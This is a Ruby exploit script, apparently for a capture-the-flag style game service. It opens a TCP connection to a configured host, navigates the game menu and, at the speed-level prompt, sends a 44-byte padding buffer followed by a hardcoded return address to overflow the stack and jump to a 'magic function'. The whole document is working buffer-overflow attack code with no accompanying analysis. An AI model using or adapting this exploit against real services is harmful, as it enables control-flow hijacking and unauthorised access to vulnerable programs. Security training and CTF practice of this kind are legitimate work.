require 'socket'
require './ipconfig.rb'

# need to fill in basic info in ipconfig.rb
hostname = HOSTNAME
port = PORT
# where you want to jump after doing leaking
return_addr = "\xcd\x88\x04\x08"

# follwing is the buffer to do leaking
# fill total 44 char, it's to fill the space between s[0] and return_addr
buf = ''
44.times { buf << 'a' }
# fill the return address
buf << return_addr
buf << "\r\n"
puts buf

s = TCPSocket.open(hostname, port)

# Read lines by lines from the socket
while line = s.gets
  print line

  # send choice '1' to start game
  (line.chop.eql? '3.Exit') && s.send("1\r\n", 0)
  # send speed setting and leak here!
  # jump to the magic function!
  (line.chop.eql? 'Choose the speed level(1-9):') && s.send(buf, 0)

end
s.close
